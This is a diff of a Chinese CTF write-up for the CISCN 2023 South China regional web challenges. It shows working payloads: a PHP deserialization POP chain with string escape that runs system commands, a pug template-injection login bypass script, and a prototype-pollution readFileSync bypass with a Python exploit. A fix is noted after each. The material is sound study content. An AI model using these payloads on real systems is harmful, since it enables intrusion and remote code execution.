@@ -1,7 +1,10 @@
 # CISCN2023华南分区赛
 
 
-[https://l1nyz-tel.cc/2023/6/25/CISCN2023-HN/](https://l1nyz-tel.cc/2023/6/25/CISCN2023-HN/)
+参考：
+
+[https://l1nyz-tel.cc/2023/6/25/CISCN2023-HN/](https://l1nyz-tel.cc/2023/6/25/CISCN2023-HN/)  
+
 只有web和pwn，还有一个re签到题（不会
 
 ## web
@@ -78,7 +81,7 @@ if(isset($_GET['ciscn_huaibei.pop'])){
 #### 思路一
 利用链：Done.__invoke() <-- Get.__get() <-- Get.__toString() <-- Go.__destruct()
 通过引用绕过wakeup
-```
+```php
 $done = new Done();
 $done->useless = 'phpinfo();';
 $done->eval = &$done->use;
@@ -91,29 +94,29 @@ $go->ray = $get2;
 
 $exp = serialize($go);
 ```
-```
+```bash
 O:2:"Go":1:{s:3:"ray";O:3:"Get":2:{s:4:"func";N;s:4:"name";O:3:"Get":2:{s:4:"func";O:4:"Done":4:{s:4:"eval";N;s:5:"class";N;s:3:"use";R:6;s:7:"useless";s:10:"phpinfo();";}s:4:"name";N;}}}
 ```
 再通过filter函数导致序列化数据变短，覆盖部分数据，进行反序列化逃逸
 ciscn_huaibei.pop为getflag，pop为上述序列化数据，过滤后如下
-```
+```bash
 O:5:"Start":2:{s:5:"start";s:7:"hark";s:3:"end";s:187:"O:2:"Go":1:{s:3:"ray";O:3:"Get":2:{s:4:"func";N;s:4:"name";O:3:"Get":2:{s:4:"func";O:4:"Done":4:{s:4:"eval";N;s:5:"class";N;s:3:"use";R:6;s:7:"useless";s:10:"phpinfo();";}s:4:"name";N;}}}";}
 ```
 要把`";s:3:"end";s:187:`这部分覆盖掉，getflag变成hark缩短3位，故需要6个getflag
 同时要满足end元素的值为序列化数据，序列化数据前添加`;s:3:"end";`
-```
+```bash
 ;s:3:"end";O:2:"Go":1:{s:3:"ray";O:3:"Get":2:{s:4:"func";N;s:4:"name";O:3:"Get":2:{s:4:"func";O:4:"Done":4:{s:4:"eval";N;s:5:"class";N;s:3:"use";R:6;s:7:"useless";s:10:"phpinfo();";}s:4:"name";N;}}}
 ```
 同时，引用在序列化中值R也要改变
 直接构造$end=$go，序列化后发现引用值R为8
 最后payload：
-```
+```bash
 ?ciscn_huaibei.pop=getflaggetflaggetflaggetflaggetflaggetflag&pop=;s:3:"end";O:2:"Go":1:{s:3:"ray";O:3:"Get":2:{s:4:"func";N;s:4:"name";O:3:"Get":2:{s:4:"func";O:4:"Done":4:{s:4:"eval";N;s:5:"class";N;s:3:"use";R:8;s:7:"useless";s:10:"phpinfo();";}s:4:"name";N;}}}
 ```
 #### 思路二
 利用链：Get.__get() <-- Get.__toString() <-- Go.__destruct()
 直接用`call_user_func`执行命令，不用Done类，也就不用绕过wake了
-```javascript
+```php
 $get = new Get();
 $get1 = new Get();
 $get1->func = "system";
@@ -125,11 +128,14 @@ $go->ray = $get;
 ```
 接着便是序列化对象逃逸
 最后payload
-```javascript
+
+```bash
 ?ciscn_huaibei.pop=getflaggetflaggetflaggetflaggetflaggetflaggetflag&pop=;;";s:3:"end";O:2:"Go":1:{s:3:"ray";O:3:"Get":2:{s:4:"func";s:6:"whoami";s:4:"name";O:3:"Get":2:{s:4:"func";s:6:"system";s:4:"name";N;}}}
 ```
-fix
+fix  
+
 删掉`$this->use=$this->useless;`
+
 ### emoji
 数组绕过；pug模板注入
 ```javascript
@@ -209,16 +215,20 @@ app.listen('80', () => {
 判断条件：
 `username.toString().substring(0,2)===admin.username.substring(0,2)&&password===admin.password.substring(1,15)`
 数组配合toString绕过
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689392410314-f4e0ad2e-2aa1-4737-8344-0b8385044c49.png#averageHue=%23212327&clientId=u39f79e6e-e562-4&from=paste&height=63&id=ud7a14782&originHeight=63&originWidth=219&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2715&status=done&style=none&taskId=u300418b5-39b9-4043-beda-9706cda0c97&title=&width=219)
+![image-20230910015103472](https://raw.githubusercontent.com/githubmof/img/main/img/image-20230910015103472.png)
+
 json提交
-```javascript
+
+```json
 data={
   "username":["admin"],
   "password":"\ude0d😂😍😒😘💕😁\ud83d"
 }
 ```
-`res.send (pugjs.render(hello))`，存在pug模板注入，hello包含username
+`res.send (pugjs.render(hello))`，存在pug模板注入，hello包含username  
+
 最后payload：
+
 ```python
 import requests
 url="http://127.0.0.1"
@@ -234,7 +244,8 @@ print(r.text)
 ```
 ![image-20230805011736905](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050117091.png)
 
-fix
+fix  
+
 pug ssti黑名单
 
 ### pollution
@@ -322,15 +333,17 @@ app.listen(port, () => {
 })
 ```
 原型链污染
-```javascript
+```json
 {
-	“username":"mof",
-  "__proto__":{"admin":True}
+	"username":"mof",
+  	"__proto__":{"admin":True}
 }
 ```
-readFileSync绕过
+readFileSync绕过  
+
 [https://cloud.tencent.com/developer/article/2123023](https://cloud.tencent.com/developer/article/2123023)
-```javascript
+
+```json
 {
   "file":{
     "href":"mof",
@@ -342,7 +355,7 @@ readFileSync绕过
 }
 ```
 payload:
-```javascript
+```python
 import requests
   
 url1="http://127.0.0.1/login"
@@ -367,7 +380,8 @@ r=s.post(url=url2,json={
 })
 print(r.text)
 ```
-fix
+fix  
+
 `JSON5.parse` 改成 `JSON.parse` 即可
 
 
